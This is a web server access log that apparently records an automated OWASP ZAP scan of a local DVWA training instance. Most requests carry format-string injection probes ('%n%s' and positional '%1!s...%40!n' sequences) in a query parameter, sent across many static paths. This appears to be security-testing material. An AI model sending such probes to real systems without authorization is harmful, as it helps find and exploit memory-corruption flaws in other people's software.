172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /docs/DVWA_v1.3.pdf?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /docs/?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /docs?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 301 1250 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /docs/?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /docs/DVWA_v1.3.pdf?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa?query=ZAP HTTP/1.1" 301 540 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/?query=ZAP HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 301 866 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/css?query=ZAP HTTP/1.1" 301 548 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 301 1250 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/css/?query=ZAP HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/css?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 301 874 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/css/?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/css?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 301 1258 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/css/?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/css/login.css?query=ZAP HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/css/main.css?query=ZAP HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/css/login.css?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/css/main.css?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/css/login.css?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/css/main.css?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/images?query=ZAP HTTP/1.1" 301 554 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/images/?query=ZAP HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/images?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 301 880 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/images/login_logo.png?query=ZAP HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/images/?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/images/login_logo.png?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/images?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 301 1264 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/images/?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/images/login_logo.png?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/images/logo.png?query=ZAP HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/images/RandomStorm.png?query=ZAP HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/images/logo.png?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/images/RandomStorm.png?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/images/logo.png?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:48 +0000] "GET /dvwa/images/RandomStorm.png?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /dvwa/images/spanner.png?query=ZAP HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /dvwa/images/spanner.png?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /dvwa/js?query=ZAP HTTP/1.1" 301 546 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /dvwa/images/spanner.png?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /dvwa/js/?query=ZAP HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /dvwa/js?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 301 872 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /dvwa/js/?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /dvwa/js?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 301 1256 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /dvwa/js/?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /dvwa/js/add_event_listeners.js?query=ZAP HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /dvwa/js/dvwaPage.js?query=ZAP HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /dvwa/js/add_event_listeners.js?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /dvwa/js/dvwaPage.js?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /dvwa/js/add_event_listeners.js?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /dvwa/js/dvwaPage.js?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /favicon.ico?query=ZAP HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /instructions.php?query=ZAP HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /favicon.ico?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
